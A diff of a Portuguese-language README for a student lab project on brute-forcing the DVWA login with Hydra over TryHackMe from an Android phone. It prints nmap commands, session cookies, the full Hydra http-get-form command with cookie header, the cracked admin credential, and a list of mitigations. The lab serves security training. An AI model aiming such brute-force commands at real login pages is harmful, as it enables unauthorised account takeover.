@@ -1,56 +1,47 @@
-# dvwa-bruteforce-hydra-lab
-Ataque de força bruta com Hydra em (DVWA).
+🔐 DVWA Bruteforce Hydra Lab
+
+Projeto prático de teste de intrusão em aplicação web, explorando falhas de autenticação por meio de ataque de força bruta com a ferramenta Hydra.
 
 ---
 
-🔐 Projeto DIO - Ataque de Força Bruta com Hydra em DVWA
-
 📌 Descrição
 
-Este projeto demonstra a execução de um ataque de força bruta em uma aplicação web vulnerável (DVWA - Damn Vulnerable Web Application), utilizando a ferramenta Hydra.
+Este projeto demonstra a execução de um ataque de força bruta na aplicação vulnerável DVWA (Damn Vulnerable Web Application).
 
-O objetivo foi identificar credenciais válidas explorando a ausência de mecanismos de proteção contra múltiplas tentativas de autenticação.
-
+O objetivo foi identificar credenciais válidas explorando a ausência de mecanismos de proteção contra múltiplas tentativas de autenticação, evidenciando riscos reais de comprometimento do sistema.
 
 ---
 
 🧠 Ambiente Utilizado
 
-Devido à limitação de hardware (uso de celular), o ambiente foi adaptado:
+Devido à limitação de hardware (uso de dispositivo móvel), o ambiente foi adaptado:
 
-
-🎯 Alvo: DVWA
-
-📱 Dispositivo: Android
-
-🌐 Plataforma: TryHackMe
-
-🔐 VPN: OpenVPN (TryHackMe)
-
-🖥️ Ambiente Linux: UserLAnd (Ubuntu)
-
-
+- 🎯 Alvo: DVWA
+- 📱 Dispositivo: Android
+- 🌐 Plataforma: TryHackMe
+- 🔐 VPN: OpenVPN (TryHackMe)
+- 🖥️ Ambiente Linux: UserLAnd (Ubuntu)
 
 ---
 
 🛠️ Ferramentas Utilizadas
 
-Nmap → Enumeração de portas e serviços
-
-Hydra → Ataque de força bruta em formulário web
-
+- Nmap → Enumeração de portas e serviços
+- Hydra → Ataque de força bruta em formulário web
+- Kiwi Browser (DevTools) → Análise de requisições HTTP e cookies
 
 ---
 
 🔍 Enumeração
 
-Foi realizada a identificação de serviços ativos no alvo:
+Identificação de serviços ativos no alvo:
 
-nmap -p 80,443 10.64.160.77
+nmap -sV -sC 10.65.142.185
 
-Resultado:
+Resultados relevantes:
 
-Porta 80 (HTTP) aberta
+- Porta 22 (SSH) aberta
+- Porta 80 (HTTP) aberta
 
 ---
 
@@ -58,15 +49,7 @@ Porta 80 (HTTP) aberta
 
 A aplicação DVWA foi acessada via navegador:
 
-http://10.64.160.77
-
-Login padrão:
-
-admin / password
-
-O nível de segurança foi configurado como:
-
-LOW
+http://10.65.142.185
 
 ---
 
@@ -76,74 +59,65 @@ O ataque foi realizado no módulo:
 
 /vulnerabilities/brute/
 
-⚠️ Desafio Encontrado
-
-Inicialmente, o Hydra retornava múltiplas senhas válidas (falso positivo), devido à ausência do cookie de sessão.
-
 ---
 
 🍪 Uso de Cookie de Sessão
 
-Foi necessário capturar o cookie de autenticação:
+Para execução correta do ataque, foi necessário utilizar um cookie de sessão válido:
 
-PHPSESSID=g2urb7k0lf2igvvbi1uuto9gk5; security=low
+PHPSESSID=out1ugcuu8ubjbgsdhu1e5mq77; security=low
 
 ---
 
 💻 Comando Utilizado
 
-hydra -l admin -P senhas.txt 10.64.160.77 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=g2urb7k0lf2igvvbi1uuto9gk5; security=low"
+hydra -l admin -P senhas.txt 10.65.142.185 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect:H=Cookie: PHPSESSID=out1ugcuu8ubjbgsdhu1e5mq77; security=low"
 
 ---
 
 ✅ Resultado
 
-O Hydra identificou a credencial válida:
+Credencial válida identificada com sucesso:
 
-login: admin
-
-password: password
+- Login: "admin"
+- Senha: "password"
 
 ---
 
 ⚠️ Vulnerabilidades Identificadas
 
-
-• Exposição a ataques de força bruta
-
-• Ausência de autenticação multifator (MFA)
-
-• Ausência de limitação de tentativas de login
+- Exposição a ataques de força bruta
+- Ausência de autentação multifator (MFA)
+- Falta de limitação de tentativas de login
+- Exposição de informações em cabeçalhos HTTP
+- Uso de HTTP sem criptografia
 
 ---
 
 🛡️ Medidas de Mitigação
 
-• Utilizar CAPTCHA
-
-• Monitorar tentativas suspeitas
-
-• Adotar autenticação multifator (MFA)
-
-• Implementar bloqueio após múltiplas tentativas
+- Implementar limitação de tentativas de login
+- Adotar autenticação multifator (MFA)
+- Configurar cookies com atributos de segurança (HttpOnly e Secure)
+- Utilizar HTTPS para proteger dados em trânsito
+- Monitorar atividades suspeitas
 
 ---
 
 📊 Conclusão
 
-O teste demonstrou que aplicações sem mecanismos de proteção adequados são altamente vulneráveis a ataques de força bruta.
+O teste de intrusão evidenciou falhas críticas no mecanismo de autenticação, permitindo a obtenção de credenciais válidas por meio de ataque automatizado.
 
-Além disso, foi necessário o uso de uma sessão autenticada (PHPSESSID) para execução correta do ataque, evidenciando a importância do gerenciamento seguro de sessões.
+Também foram identificadas fragilidades na configuração da aplicação, incluindo exposição de informações sensíveis e ausência de criptografia nas comunicações.
 
 ---
 
 🚀 Observação Final
 
-Este projeto foi realizado inteiramente em ambiente mobile, demonstrando a viabilidade de execução de testes de segurança mesmo com limitações de hardware.
+Este projeto foi desenvolvido integralmente em ambiente mobile, demonstrando a viabilidade de execução de testes de segurança mesmo com recursos limitados.
 
 ---
 
-
 👩‍💻 Autora
 
-Projeto desenvolvido por " Kelwri Jheine "
+Kelwri Jheine
